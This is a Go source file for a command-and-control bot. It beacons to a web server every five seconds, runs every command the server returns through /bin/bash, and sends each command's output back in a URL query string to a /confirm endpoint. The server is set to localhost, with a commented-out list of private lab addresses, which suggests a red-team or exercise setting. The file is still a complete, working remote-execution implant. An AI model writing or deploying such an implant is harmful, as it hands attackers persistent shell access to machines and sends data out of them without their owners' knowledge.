// Golang bot to pull commands from webserver and execute them
// @author: _rap7or

package main

import (
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

var server = getServer()
var loopTime = 5 // sleep time

func getServer() string {
	/**
	servs := make([]string, 0)
	servs = append(servs,
		"192.168.5.130",
		"192.168.5.146",
		"192.168.5.169",
		"192.168.5.171",
		"192.168.5.204",
		"192.168.5.21",
		"192.168.5.215",
		"192.168.5.218",
		"192.168.5.223",
		"192.168.5.250",
		"192.168.5.76",
		"192.168.6.137",
		"192.168.6.200",
		"192.168.6.202",
		"192.168.6.204",
		"192.168.6.44",
		"192.168.6.51",
		"192.168.6.63",
		"192.168.6.76",
		"192.168.6.95",
	)
	selection := servs[rand.Intn(len(servs))]
	return string(selection)
	*/
	return "localhost"
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func getCommands() {
	ip := getIP()
	c2 := "http://" + server + "/beacon?ip=" + ip

	resp, err := http.Get(c2)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}

	cmdString := string(body)
	if cmdString != "[]" {
		cmdString = strings.Replace(cmdString, "[", "", -1)
		cmdString = strings.Replace(cmdString, "]", "", -1)
		cmdList := strings.Split(cmdString, ",")

		for _, cmd := range cmdList {
			cmd = strings.Replace(cmd, "\"", "", -1)
			cmd = strings.Trim(cmd, " ")
			run(cmd)
		}
	}
}

func run(cmd string) {
	output, err := exec.Command("/bin/bash", "-c", cmd).Output()
	if err != nil {
		log.Print(err)
	}
	out := url.QueryEscape(string(output))
	out = strings.Trim(out, " ")
	out = strings.Trim(out, "%0A")
	ip := getIP()

	cmd = url.QueryEscape(cmd)
	c2 := "http://" + server + "/confirm?ip=" + ip + "&cmd=" + cmd + "&output=" + out
	_, err = http.Get(c2)
	if err != nil {
		log.Print(err)
	}
}

func main() {
	for {
		getCommands()
		time.Sleep(time.Duration(loopTime) * time.Second)
	}
}
